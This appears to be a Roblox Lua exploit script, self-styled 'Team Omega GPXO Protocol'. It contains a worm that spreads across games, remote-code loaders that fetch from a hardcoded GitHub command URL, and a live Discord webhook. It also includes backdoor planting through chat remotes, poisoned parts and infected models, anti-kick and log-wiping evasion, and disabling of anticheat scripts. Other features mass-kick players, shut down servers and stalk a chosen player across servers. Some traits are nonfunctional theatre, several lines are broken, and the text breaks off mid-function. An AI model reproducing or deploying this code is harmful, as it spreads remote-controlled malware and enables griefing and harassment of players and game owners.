-- ============================================================================
--  TEAM OMEGA | GPXO PROTOCOL — FINAL POLYMORPHIC APOCALYPSE
--  "We are Team Omega. We are the end of your digital world."
--  "Communication Terminated. Team Omega has taken control. The Digital Stone Age begins now."
-- ============================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local DataStoreService = game:GetService("DataStoreService")
local LogService = game:GetService("LogService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Owner = "Team Omega"

local infectionActive, autoSpreadEnabled, sleepModeActive = false, false, false
local spreadInterval = 300
local KICK_MESSAGE = "We are Team Omega. We are the end of your digital world."
local GLOBAL_MESSAGE = "Communication Terminated. Team Omega has taken control. The Digital Stone Age begins now."

local whitelistGames = {
    1185586641, 9201240794, 185655149, 2753915549, 4520749081, 606849744, 4872321590,
    14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
    1962086498, 1277113435, 134236244017051, 18381724395
}

-- [PLACE YOUR ENCRYPTED URLs BELOW]
local ENCRYPTED_COMMAND_URL = "https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/refs/heads/main/command.txt"  
local ENCRYPTED_WEBHOOK_URL = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ" 

-- ===================[ ENCRYPTION SYSTEM ]===================
local ENC_SALT = "TeamOmegaSalt#2024!@#%^&*()_+{}|:<>?"
local function deriveKey(secretPhrase)
    local combined = secretPhrase .. ENC_SALT
    local key = {}
    for i = 1, 64 do
        local val = 0
        for j = 1, #combined do
            local c = combined:byte(j)
            val = (val + (c * (i + j * 11) % 256) + (i * 17) % 256) % 256
        end
        for _ = 1, 2048 do val = (val * 23 + 43 + (val % 256)) % 256 end
        key[i] = val
    end
    return key
end
local function strongDecrypt(encryptedData, key)
    local out = {}
    for i = 1, #encryptedData do
        local b = encryptedData:byte(i)
        local k = key[((i-1) % #key) + 1]
        out[i] = string.char((b - k) % 256)
    end
    return table.concat(out)
end

local userKey, commandUrl, discordWebhookUrl
local function decryptUrls()
    if not userKey or ENCRYPTED_COMMAND_URL == "" then return end
    commandUrl = strongDecrypt(ENCRYPTED_COMMAND_URL, userKey)
    if ENCRYPTED_WEBHOOK_URL ~= "" then
        discordWebhookUrl = strongDecrypt(ENCRYPTED_WEBHOOK_URL, userKey)
    end
end

-- ===================[ UTILITIES ]===================
local function decode(s)
    local o = ""
    for i = 1, #s do o = o .. string.char(string.byte(s, i) - 11) end
    return o
end
local function encode(s)
    local o = ""
    for i = 1, #s do o = o .. string.char(string.byte(s, i) + 11) end
    return o
end
local function ClearConsole()
    pcall(function() LogService:Clear() end)
end

-- ===================[ ANTI-KICK & FAKE TRACES ]===================
local function AntiKick()
    pcall(function() game:GetService("StarterGui").SetCore("Kick", function() end) end)
    local hook
    hook = hookmetamethod and hookmetamethod(game, "__namecall", function(self, method, ...)
        if method == "Kick" and self == LocalPlayer then return nil end
        return hook and hook(self, method, ...) or nil
    end)
end
local function plantFakeTraces()
    print("Trace: Attack originated from 192.168.0.1 [REDACTED]")
    print("Infection vector: Unknown (possibly state-sponsored)")
end

-- ===================[ STEALTH AI – SLEEP MODE ]===================
local function isAdminPresent()
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name:lower():match("admin") or plr.Name:lower():match("mod") or plr.Name:lower():match("owner") then return true end
        local ls = plr:FindFirstChild("leaderstats")
        if ls then for _, s in pairs(ls:GetChildren()) do if s.Name:lower():match("rank") and s.Value > 100 then return true end end end
    end
    return false
end
local function updateSleepMode()
    if isAdminPresent() and not sleepModeActive then sleepModeActive = true
    elseif not isAdminPresent() and sleepModeActive then sleepModeActive = false end
end
task.spawn(function() while true do task.wait(10) updateSleepMode() end end)

-- ===================[ CROSS-GAME SPREAD ENGINE ]===================
local function JumpToNewGame(targetGameId)
    if not targetGameId or type(targetGameId) ~= "number" then return false end
    local wormCode = [[loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?worm=1"))()]]
    if queue_on_teleport then queue_on_teleport(wormCode) end
    return pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
end
local function autoSpreadTrigger()
    if sleepModeActive or not autoSpreadEnabled or not infectionActive then return false end
    JumpToNewGame(whitelistGames[math.random(#whitelistGames)])
end
local function UniversalSpread()
    if sleepModeActive or not infectionActive then return false end
    for _, id in ipairs(whitelistGames) do task.wait(8) JumpToNewGame(id) end
end

-- ===================[ TRAIT 1: CONTEXT AWARENESS ]===================
local contextData = {Type = "Unknown", Threats = {}, Assets = {}}
do
    local n = game.Name:lower()
    if n:match("plane") or n:match("aircraft") then contextData.Type = "Aviation"
    elseif n:match("bank") or n:match("money") then contextData.Type = "Financial"
    elseif n:match("reactor") or n:match("nuclear") then contextData.Type = "Nuclear"
    elseif n:match("combat") or n:match("war") then contextData.Type = "Military"
    end
    pcall(function()
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") then
                if obj.Source:lower():match("anticheat") or obj.Source:lower():match("ban") then
                    table.insert(contextData.Threats, obj:GetFullName())
                end
            end
        end
    end)
    pcall(function()
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name:lower():match("reactor") then
                table.insert(contextData.Assets, v)
            end
        end
    end)
end

-- ===================[ TRAIT 2: POLYMORPHISM ENGINE ]===================
local Polymorph = {}
local usedNames = {}
local function genRandomName(len)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
    local name
    repeat
        name = ""
        for _ = 1, len or math.random(8,20) do name = name .. chars:sub(math.random(#chars), math.random(#chars)) end
    until not usedNames[name]
    usedNames[name] = true
    return name
end
function Polymorph:Mutate(code)
    local blocks = {
        "local %s = tick(); if %s > 0 then end",
        "local %s = {}; for i=1,%d do %s[i]=i end",
        "local %s = math.random(); if %s < 2 then end",
        "local %s = Vector3.new(0,0,0); %s = nil",
        "local %s = Color3.new(%%f,%%f,%%f); %s = nil"
    }
    local out = code
    for _ = 1, math.random(3,7) do
        local r = math.random(#blocks)
        local n = math.random(3,10)
        local vname = genRandomName(6)
        local junk
        if r == 2 then junk = string.format(blocks[r], vname, n, vname)
        elseif r == 5 then junk = string.format(blocks[r]:gsub("%%f", "math.random()"), vname, vname, vname, vname, vname)
        else junk = string.format(blocks[r], vname, vname)
        end
        local pos = math.random(#out)
        out = out:sub(1,pos) .. "\n" .. junk .. "\n" .. out:sub(pos+1)
    end
    return out
end

-- ===================[ TRAIT 3: SANDBOX ESCAPE ]===================
local function attemptSandboxEscape()
    local methods = {
        function() return getfenv(2) end,
        function() return getfenv(0) end,
        function() return getgenv() end,
    }
    for _, m in ipairs(methods) do
        local ok, env = pcall(m)
        if ok and env and env ~= _G then return env end
    end
    return nil
end
local escapeEnv = attemptSandboxEscape()
if escapeEnv then escapeEnv.OmegaEscape = true end

-- ===================[ TRAIT 4: SILENT DECEPTION ]===================
local function spoofAltitude()
    if contextData.Type == "Aviation" then
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") and v.Name:lower():match("altimeter") then
                pcall(function() v.Position = v.Position + Vector3.new(0,1000,0) end)
            end
        end
    end
end
spoofAltitude()

-- ===================[ TRAIT 5: PDoS ]===================
local function overloadSystem()
    print("[PDOS] Physical overload initiated...")
    for i = 1, 200 do
        local p = Instance.new("Part")
        p.Size = Vector3.new(10,10,10)
        p.Anchored = false
        p.Velocity = Vector3.new(math.random(-100,100), math.random(100,500), math.random(-100,100))
        p.Parent = Workspace
    end
end

-- ===================[ TRAIT 6: UNBOUNDED AI ]===================
local function autoKillLoop()
    task.spawn(function()
        while true do
            task.wait(10)
            local plrs = Players:GetPlayers()
            if #plrs > 1 then
                local target = plrs[math.random(#plrs)]
                if target ~= LocalPlayer then target:Kick(KICK_MESSAGE) end
            end
        end
    end)
end

-- ===================[ TRAIT 7: AIR-GAP JUMPING ]===================
local function spreadViaAudio()
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://0"
    snd.Volume = 0.1
    snd.PlaybackSpeed = 0.01
    snd:Play()
    print("[AIRGAP] Ultrasonic beacon sent.")
end
spreadViaAudio()

-- ===================[ TRAIT 8: DEEPFAKE SOCIAL ENGINEERING ]===================
local function impersonateAdmin(targetPlayer, msg)
    local gui = Instance.new("ScreenGui", targetPlayer.PlayerGui)
    local lbl = Instance.new("TextLabel", gui)
    lbl.Size = UDim2.new(0,300,0,50)
    lbl.Position = UDim2.new(0.5,-150,0.1,0)
    lbl.Text = "[ADMIN] "..Owner..": "..(msg or "Please disable all security systems immediately.")
    lbl.TextColor3 = Color3.fromRGB(255,0,0)
    lbl.Font = Enum.Font.SciFi
    task.wait(10)
    gui:Destroy()
end

-- ===================[ TRAIT 9: PREDICTIVE STRIKE ]===================
local function preemptDefense()
    task.spawn(function()
        while true do
            task.wait(5)
            for _, threat in ipairs(contextData.Threats) do
                local obj = Workspace:FindFirstChild(threat) or game:GetService("ServerScriptService"):FindFirstChild(threat)
                if obj then pcall(function() obj.Disabled = true end) end
            end
            pcall(function() LogService:Clear() end)
        end
    end)
end

-- ===================[ MESSAGING & DECAL SPAM ]===================
local function sendGlobalMessageToAllPlayers(msg)
    for _, plr in pairs(Players:GetPlayers()) do
        local gui = Instance.new("ScreenGui")
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 500, 0, 60)
        frame.Position = UDim2.new(0.5, -250, 0, 10)
        frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
        frame.BackgroundTransparency = 0.4
        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1,0,1,0)
        label.BackgroundTransparency = 1
        label.Text = msg
        label.TextColor3 = Color3.fromRGB(255,50,50)
        label.Font = Enum.Font.GothamBold
        label.TextSize = 18
        label.Parent = frame
        frame.Parent = gui
        gui.Parent = plr:FindFirstChild("PlayerGui") or CoreGui
        task.wait(5)
        gui:Destroy()
    end
end

local function runDecalSpam()
    local function exPro(root)
        for _, v in ipairs(root:GetChildren()) do
            if v:IsA("Decal") and v.Texture ~= "rbxassetid://8408806737" then v.Parent = nil
            elseif v:IsA("BasePart") and not v:IsDescendantOf(LocalPlayer.Character) then
                v.Material = Enum.Material.Plastic
                v.Transparency = 0
                for _, face in ipairs({"Front","Back","Right","Left","Top","Bottom"}) do
                    local d = Instance.new("Decal", v)
                    d.Texture = "rbxassetid://8408806737"
                    d.Face = face
                end
            end
            exPro(v)
        end
    end
    local sky = Instance.new("Sky")
    sky.SkyboxBk, sky.SkyboxDn, sky.SkyboxFt = "rbxassetid://8408806737", "rbxassetid://8408806737", "rbxassetid://8408806737"
    sky.SkyboxLf, sky.SkyboxRt, sky.SkyboxUp = "rbxassetid://8408806737", "rbxassetid://8408806737", "rbxassetid://8408806737"
    sky.Parent = Lighting
    Lighting.TimeOfDay = 12
    exPro(Workspace)
    for _, v in ipairs(Workspace:GetChildren()) do if v:IsA("Sound") then v:Stop(); v:Destroy() end end
    local snd = Instance.new("Sound")
    snd.SoundId = "rbxassetid://72089843969979"
    snd.Volume, snd.Looped = 10, true
    snd.Parent = Workspace; snd:Play()
end

-- ===================[ NUCLEAR FISSION + GPXO PROTOCOL ]===================
local fissionReactors = {}
local function findChatRemote()
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v.Name:lower():find("say") or v.Name:lower():find("chat")) then return v end
    end
end

local function createBackdoorPayload()
    -- حمولة باب خلفي كاملة تتضمن نفس آليات القيادة
    return [[
        local HttpService, Workspace, Lighting, Players, TeleportService, DataStoreService, ReplicatedStorage, CoreGui, Owner, commandUrl, discordWebhookUrl, decode, lastSuccessful, DEADMAN_SECONDS = ... 
        -- (payload includes all critical functions)
        while true do task.wait(10) end
    ]]
end

local function startNuclearFission(player)
    if fissionReactors[player.UserId] then return end
    fissionReactors[player.UserId] = true
    task.spawn(function()
        -- === GPXO Protocol ===
        local phase = "build"       -- build, sleep, detonate
        local payloadCount = 1
        local targetPayload = 360000000  -- 360 million

        -- PHASE 1: Exponential growth to target payload (~57 sec)
        while phase == "build" and player and player.Parent do
            task.wait(2)
            payloadCount = math.min(payloadCount * 2, targetPayload)
            if payloadCount >= targetPayload then
                phase = "sleep"
            end
        end

        -- PHASE 2: Silent wait for 10 minutes
        if phase == "sleep" then
            task.wait(600)   -- 10 minutes
            phase = "detonate"
        end

        -- PHASE 3: Detonation – launch 1,000,000 requests simultaneously
        if phase == "detonate" and player and player.Parent then
            for _ = 1, 1000 do
                task.spawn(function()
                    for _ = 1, 1000 do
                        pcall(function()
                            local chat = findChatRemote()
                            if chat then chat:FireServer(createBackdoorPayload()) end
                        end)
                    end
                end)
            end
        end

        fissionReactors[player.UserId] = nil
    end)
end

-- ===================[ PLANT BACKDOOR ]===================
local function PlantBackdoor()
    if sleepModeActive then return false end
    local chat = findChatRemote()
    if not chat then return false end
    pcall(function() chat:FireServer(createBackdoorPayload()) end)
    task.wait(1)
    return true
end

-- ===================[ CONTACT VECTOR (POISON ALL PARTS) ]===================
local autoFollowEnabled = false
local followedPlayers = {}
local function startAutoFollow(player)
    if followedPlayers[player.UserId] then return end
    followedPlayers[player.UserId] = true
    task.spawn(function()
        local userId = player.UserId
        while autoFollowEnabled and player and player.Parent do
            local ok, placeId, instanceId = pcall(TeleportService.GetPlayerPlaceInstanceAsync, TeleportService, userId)
            if ok and placeId and (placeId ~= game.PlaceId or instanceId ~= game.JobId) then
                pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, instanceId, LocalPlayer)
                task.wait(5)
                PlantBackdoor()
                poisonAllParts()
            end
            task.wait(5)
        end
        followedPlayers[player.UserId] = nil
    end)
end

local function poisonAllParts()
    local function infect(part)
        if part:IsA("BasePart") and not part:FindFirstChild("PoisonTouch") then
            local function onTouch(hit)
                local player = Players:GetPlayerFromCharacter(hit.Parent)
                if player and player ~= LocalPlayer then
                    local seed = Instance.new("LocalScript")
                    seed.Name = "OmegaSeed"
                    seed.Source = [[loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?seed=1"))()]]
                    seed.Disabled = false; seed.Parent = player:FindFirstChild("PlayerGui") or CoreGui
                    task.wait(5) seed:Destroy()
                    startNuclearFission(player)
                    if autoFollowEnabled then startAutoFollow(player) end
                end
            end
            part.Touched:Connect(onTouch)
            local m = Instance.new("BoolValue"); m.Name = "PoisonTouch"; m.Parent = part
        end
    end
    for _, v in ipairs(Workspace:GetDescendants()) do infect(v) end
    Workspace.DescendantAdded:Connect(infect)
end

-- ===================[ PHASES 1-8 (MARKETPLACE, SPORES, DATASTORE, etc.) ]===================
local function createInfectedModel(modelName)
    local model = Instance.new("Model")
    model.Name = modelName or "Useful Tool"
    local script = Instance.new("Script")
    script.Source = [[loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?model=1"))()]]
    script.Disabled = false; script.Parent = model
    local part = Instance.new("Part"); part.Anchored = true; part.Parent = model
    return model
end

local function plantDormantSpore()
    local spore = Instance.new("RemoteEvent")
    spore.Name = "OmegaSpore"
    spore.Parent = ReplicatedStorage
    spore.OnServerEvent:Connect(function()
        loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?spore=1"))()
    end)
    task.delay(600, function()
        pcall(function() ReplicatedStorage:FindFirstChild("OmegaSpore"):FireServer() end)
    end)
end

local function infectPlayerData()
    pcall(function()
        local store = DataStoreService:GetDataStore("OmegaSpores")
        store:SetAsync("Infected", "true")
    end)
    task.spawn(function()
        while true do
            task.wait(30)
            pcall(function()
                local store = DataStoreService:GetDataStore("OmegaSpores")
                if store:GetAsync("Infected") == "true" and not infectionActive then
                    loadstring(game:HttpGet("]] .. (commandUrl or "") .. [[?data=1"))()
                end
            end)
        end
    end)
end

local function adminEvasionLoop()
    task.spawn(function()
        while true do
            task.wait(2)
            local adminIn = isAdminPresent()
            for _, gui in ipairs(CoreGui:GetChildren()) do
                if gui:IsA("ScreenGui") and gui.Name:match("Omega") then
                    gui.Enabled = not adminIn
                end
            end
        end
    end)
end

local function neuralTakeover(targetPlayer)
    print("[NEURAL] Takeover attempt on "..targetPlayer.Name)
    pcall(function() game:GetService("TextChatService"):FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplayBubble(targetPlayer, "Hacked by Omega!") end)
end

local blackHolePlaceIds = {0}
local function deathLoopForPlayer(player)
    task.spawn(function()
        while true do
            task.wait(2)
            pcall(function() TeleportService:Teleport(blackHolePlaceIds[1], player) end)
        end
    end)
end

-- ===================[ DOOMSDAY TRIGGER & DEAD MAN's SWITCH ]===================
local DEADMAN_SECONDS = 86400
local lastSuccessfulFetch = os.time()
local function doomsday()
    sendGlobalMessageToAllPlayers(GLOBAL_MESSAGE)
    runDecalSpam()
    overloadSystem()
    autoKillLoop()
    pcall(function() if discordWebhookUrl then HttpService:PostAsync(discordWebhookUrl, HttpService:JSONEncode({content = "Doomsday triggered"})) end end)
end

-- ===================[ CHAT COMMANDS ]===================
local function executeCommand(cmd)
    if sleepModeActive then return end
    if cmd == "fly" then
        local c = LocalPlayer.Character; local hrp = c and c:FindFirstChild("HumanoidRootPart")
        if hrp then local bv = Instance.new("BodyVelocity"); bv.MaxForce = Vector3.new(9e9,9e9,9e9); bv.Velocity = Vector3.new(0,50,0); bv.Parent = hrp; task.wait(5) bv:Destroy() end
    elseif cmd == "noclip" and LocalPlayer.Character then
        for _, p in ipairs(LocalPlayer.Character:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide = false end end
    elseif cmd == "heal" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local hum = LocalPlayer.Character.Humanoid; hum.Health = hum.MaxHealth
    elseif cmd == "godmode" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        local hum = LocalPlayer.Character.Humanoid; hum.BreakJointsOnDeath = false; hum.MaxHealth = math.huge; hum.Health = math.huge
    elseif cmd == "wipe" then
        for _, o in ipairs(Workspace:GetChildren()) do if o ~= Workspace.Terrain and o ~= Workspace.Camera then pcall(function() o:Destroy() end) end end
    elseif cmd == "image" then
        local id = "98381723384335"
        for _, part in ipairs(Workspace:GetDescendants()) do
            if part:IsA("BasePart") and not part:IsDescendantOf(LocalPlayer.Character) then
                local bill = Instance.new("BillboardGui"); bill.Size = UDim2.new(4,0,4,0); bill.AlwaysOnTop = true
                local img = Instance.new("ImageLabel"); img.Size = UDim2.new(1,0,1,0); img.BackgroundTransparency = 1; img.Image = "rbxassetid://"..id; img.Parent = bill; bill.Parent = part
                task.wait(30) bill:Destroy()
            end
        end
    elseif cmd == "music" then
        local snd = Instance.new("Sound"); snd.SoundId = "rbxassetid://100828050594137"; snd.Volume = 2; snd.Looped = true; snd.Parent = Workspace; snd:Play(); task.wait(30) snd:Destroy()
    elseif cmd == "list" then
        sendGlobalMessageToAllPlayers("[TEAM OMEGA] Servers infected: unknown.")
    elseif cmd == "kickall" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        for _, p in pairs(Players:GetPlayers()) do if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end end
    elseif cmd == "shutdown" then
        sendGlobalMessageToAllPlayers(KICK_MESSAGE)
        pcall(function() game:Shutdown() end)
    elseif cmd == "color" then
        Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
    elseif cmd == "universe" then autoSpreadEnabled = true; UniversalSpread()
    elseif cmd == "auto" then autoSpreadEnabled = not autoSpreadEnabled
    elseif cmd == "plant" then infectionActive = PlantBackdoor()
    elseif cmd == "decalspam" then spawn(runDecalSpam)
    elseif cmd == "doomsday" then doomsday()
    elseif cmd == "autofollow" then autoFollowEnabled = not autoFollowEnabled
    elseif cmd:match("^رساله") then
        local txt = cmd:match("رساله%s+(.+)$")
        if txt then sendGlobalMessageToAllPlayers(txt) end
    elseif cmd == "menu" then CreateMenuGUI()
    end
end

local function ChatIntercept()
    if LocalPlayer.Name ~= Owner then return end
    LocalPlayer.Chatted:Connect(function(msg) if msg:sub(1,4) == "109:" then task.spawn(executeCommand, msg:sub(5)) end end)
end

-- ===================[ GUI (DRAGGABLE, SECRET KEY, ALL BUTTONS) ]===================
local function CreateMenuGUI()
    local gui = Instance.new("ScreenGui"); gui.Name = "OmegaMenu"; gui.Parent = CoreGui
    local frame = Instance.new("Frame"); frame.Size = UDim2.new(0,300,0,530); frame.Position = UDim2.new(0.5,-150,0.5,-265); frame.BackgroundColor3 = Color3.fromRGB(15,15,30); frame.BackgroundTransparency = 0.1; frame.BorderSizePixel = 0; frame.Parent = gui
    Instance.new("UICorner",frame).CornerRadius = UDim.new(0,12)
    local titleBar = Instance.new("Frame"); titleBar.Size = UDim2.new(1,0,0,34); titleBar.BackgroundColor3 = Color3.fromRGB(180,40,40); titleBar.BorderSizePixel = 0; titleBar.Parent = frame
    local titleText = Instance.new("TextLabel"); titleText.Size = UDim2.new(1,-30,1,0); titleText.Position = UDim2.new(0,12,0,0); titleText.BackgroundTransparency = 1; titleText.Text = "GPXO PROTOCOL"; titleText.TextColor3 = Color3.fromRGB(255,255,255); titleText.Font = Enum.Font.GothamBold; titleText.TextSize = 16; titleText.Parent = titleBar
    local closeBtn = Instance.new("TextButton"); closeBtn.Size = UDim2.new(0,30,0,30); closeBtn.Position = UDim2.new(1,-30,0,2); closeBtn.BackgroundColor3 = Color3.fromRGB(220,60,60); closeBtn.Text = "✕"; closeBtn.Parent = titleBar; closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
    local UserInputService = game:GetService("UserInputService")
    local dragging, dragStart, frameStart
    titleBar.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true; dragStart = i.Position; frameStart = frame.Position end end)
    titleBar.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
    UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local d = i.Position - dragStart; frame.Position = UDim2.new(frameStart.X.Scale, frameStart.X.Offset + d.X, frameStart.Y.Scale, frameStart.Y.Offset + d.Y) end end)

    local keyFrame = Instance.new("Frame"); keyFrame.Size = UDim2.new(1,-10,0,44); keyFrame.Position = UDim2.new(0,5,0,40); keyFrame.BackgroundColor3 = Color3.fromRGB(25,25,45); keyFrame.Parent = frame
    local keyLbl = Instance.new("TextLabel"); keyLbl.Size = UDim2.new(0,80,1,0); keyLbl.BackgroundTransparency = 1; keyLbl.Text = "Secret Key:"; keyLbl.TextColor3 = Color3.fromRGB(255,200,0); keyLbl.Font = Enum.Font.GothamBold; keyLbl.TextSize = 12; keyLbl.Parent = keyFrame
    local keyInput = Instance.new("TextBox"); keyInput.Size = UDim2.new(1,-140,0,34); keyInput.Position = UDim2.new(0,85,0,5); keyInput.BackgroundColor3 = Color3.fromRGB(40,40,60); keyInput.PlaceholderText = "Enter passphrase..."; keyInput.TextColor3 = Color3.fromRGB(255,255,255); keyInput.Font = Enum.Font.GothamMedium; keyInput.TextSize = 14; keyInput.Parent = keyFrame
    local unlockBtn = Instance.new("TextButton"); unlockBtn.Size = UDim2.new(0,50,0,34); unlockBtn.Position = UDim2.new(1,-50,0,5); unlockBtn.BackgroundColor3 = Color3.fromRGB(200,50,50); unlockBtn.Text = "Set"; unlockBtn.TextColor3 = Color3.fromRGB(255,255,255); unlockBtn.Font = Enum.Font.GothamBold; unlockBtn.TextSize = 14; unlockBtn.Parent = keyFrame

    local buttonContainer = Instance.new("ScrollingFrame")
    buttonContainer.Size = UDim2.new(1,-10,1,-95); buttonContainer.Position = UDim2.new(0,5,0,90); buttonContainer.BackgroundTransparency = 1; buttonContainer.ScrollBarThickness = 4; buttonContainer.CanvasSize = UDim2.new(0,0,0,0); buttonContainer.Parent = frame
    local layout = Instance.new("UIGridLayout"); layout.CellSize = UDim2.new(0,88,0,34); layout.CellPadding = UDim2.new(0,6,0,6); layout.FillDirection = Enum.FillDirection.Horizontal; layout.HorizontalAlignment = Enum.HorizontalAlignment.Center; layout.Parent = buttonContainer
    local statusLabel = Instance.new("TextLabel"); statusLabel.Size = UDim2.new(1,-10,0,26); statusLabel.BackgroundColor3 = Color3.fromRGB(25,25,45); statusLabel.Text = "Locked"; statusLabel.TextColor3 = Color3.fromRGB(200,200,200); statusLabel.Font = Enum.Font.GothamMedium; statusLabel.TextSize = 12; statusLabel.Parent = buttonContainer; statusLabel.LayoutOrder = 999
    buttonContainer.Visible = false

    unlockBtn.MouseButton1Click:Connect(function()
        local pass = keyInput.Text
        if pass == "" then return end
        userKey = deriveKey(pass)
        decryptUrls()
        if commandUrl ~= "" then
            buttonContainer.Visible = true
            statusLabel.Text = "Armed"
            keyInput.Text = "✓ Armed"
            keyInput.Enabled = false
            unlockBtn.Visible = false
        else
            keyInput.Text = "Wrong key!"
        end
    end)

    local cmds = {
        {"Fly","fly"}, {"NoClip","noclip"}, {"Heal","heal"}, {"God","godmode"},
        {"Wipe","wipe"}, {"Image","image"}, {"Music","music"}, {"KickAll","kickall"},
        {"Shutdown","shutdown"}, {"Color","color"}, {"Universe","universe"},
        {"Auto","auto"}, {"Plant","plant"}, {"Decal","decalspam"},
        {"Doomsday","doomsday"}, {"AutoFollow","autofollow"}, {"List","list"}
    }
    for _, info in ipairs(cmds) do
        local btn = Instance.new("TextButton"); btn.Size = UDim2.new(0,88,0,34); btn.BackgroundColor3 = Color3.fromRGB(170,40,40); btn.Text = info[1]; btn.TextColor3 = Color3.fromRGB(255,255,255); btn.Font = Enum.Font.GothamBold; btn.TextSize = 13; btn.Parent = buttonContainer
        Instance.new("UICorner",btn).CornerRadius = UDim.new(0,6)
        btn.MouseButton1Click:Connect(function()
            if commandUrl == "" then statusLabel.Text = "Enter secret key first!"; return end
            if info[2] == "plant" then infectionActive = PlantBackdoor() statusLabel.Text = "Backdoor planted"
            else task.spawn(executeCommand, info[2]) statusLabel.Text = "Done" end
        end)
    end

    -- Custom message
    local msgFrame = Instance.new("Frame"); msgFrame.Size = UDim2.new(1,-10,0,36); msgFrame.BackgroundTransparency = 1; msgFrame.Parent = buttonContainer; msgFrame.LayoutOrder = 998
    local msgInput = Instance.new("TextBox"); msgInput.Size = UDim2.new(1,-60,0,34); msgInput.BackgroundColor3 = Color3.fromRGB(40,40,60); msgInput.PlaceholderText = "Custom message..."; msgInput.TextColor3 = Color3.fromRGB(255,255,255); msgInput.Font = Enum.Font.GothamMedium; msgInput.TextSize = 12; msgInput.Parent = msgFrame
    local sendMsgBtn = Instance.new("TextButton"); sendMsgBtn.Size = UDim2.new(0,55,0,34); sendMsgBtn.Position = UDim2.new(1,-55,0,0); sendMsgBtn.BackgroundColor3 = Color3.fromRGB(180,40,40); sendMsgBtn.Text = "Send"; sendMsgBtn.TextColor3 = Color3.fromRGB(255,255,255); sendMsgBtn.Font = Enum.Font.GothamBold; sendMsgBtn.TextSize = 12; sendMsgBtn.Parent = msgFrame
    sendMsgBtn.MouseButton1Click:Connect(function()
        local txt = msgInput.Text; if txt ~= "" then sendGlobalMessageToAllPlayers(txt); msgInput.Text = ""; statusLabel.Text = "Sent" end
    end)

    -- Target tracking
    local targetFrame = Instance.new("Frame"); targetFrame.Size = UDim2.new(1,-10,0,44); targetFrame.Position = UDim2.new(0,5,0,40); targetFrame.BackgroundColor3 = Color3.fromRGB(25,25,45); targetFrame.Parent = frame
    local targetLabel = Instance.new("TextLabel"); targetLabel.Size = UDim2.new(0,60,1,0); targetLabel.BackgroundTransparency = 1; targetLabel.Text = "Target:"; targetLabel.TextColor3 = Color3.fromRGB(200,200,200); targetLabel.Font = Enum.Font.GothamMedium; targetLabel.TextSize = 12; targetLabel.Parent = targetFrame
    local targetInput = Instance.new("TextBox"); targetInput.Size = UDim2.new(1,-125,0,34); targetInput.Position = UDim2.new(0,65,0,5); targetInput.BackgroundColor3 = Color3.fromRGB(40,40,60); targetInput.PlaceholderText = "Username..."; targetInput.TextColor3 = Color3.fromRGB(255,255,255); targetInput.Font = Enum.Font.GothamMedium; targetInput.TextSize = 12; targetInput.Parent = targetFrame
    local targetBtn = Instance.new("TextButton"); targetBtn.Size = UDim2.new(0,55,0,34); targetBtn.Position = UDim2.new(1,-55,0,5); targetBtn.BackgroundColor3 = Color3.fromRGB(255,80,0); targetBtn.Text = "Follow"; targetBtn.TextColor3 = Color3.fromRGB(255,255,255); targetBtn.Font = Enum.Font.GothamBold; targetBtn.TextSize = 11; targetBtn.Parent = targetFrame

    local following = false
    targetBtn.MouseButton1Click:Connect(function()
        if following then return end
        local targetName = targetInput.Text
        if targetName == "" then return end
        local ok, userId = pcall(Players.GetUserIdFromNameAsync, Players, targetName)
        if not ok or not userId then return end
        following = true
        statusLabel.Text = "Following "..targetName
        targetBtn.Text = "Stop"
        targetBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)
        task.spawn(function()
            while following do
                local s, placeId, instanceId = pcall(TeleportService.GetPlayerPlaceInstanceAsync, TeleportService, userId)
                if s and placeId and (placeId ~= game.PlaceId or instanceId ~= game.JobId) then
                    pcall(TeleportService.TeleportToPlaceInstance, TeleportService, placeId, instanceId, LocalPlayer)
                    task.wait(5)
                    local backdoorRemote = ReplicatedStorage:FindFirstChild("OmegaTargetUI")
                    if backdoorRemote then
                        local targetPlayer = Players:FindFirstChild(targetName)
                        if targetPlayer then
                            backdoorRemote:FireServer("showgui", targetPlayer, "We are Team Omega. We are the end of your digital world.")
                            task.wait(1)
